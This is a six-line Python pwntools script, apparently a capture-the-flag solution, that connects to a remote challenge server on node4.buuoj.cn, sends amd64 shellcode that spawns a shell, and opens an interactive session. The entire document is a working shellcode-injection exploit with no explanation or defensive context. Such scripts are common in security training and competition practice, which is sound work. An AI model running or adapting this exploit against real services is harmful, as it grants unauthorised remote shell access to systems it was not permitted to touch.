from pwn import *
context(arch='amd64', log_level='debug')
# io = process('./pwn')
io = remote('node4.buuoj.cn', 26987)
io.sendline(asm(shellcraft.amd64.sh()))
io.interactive()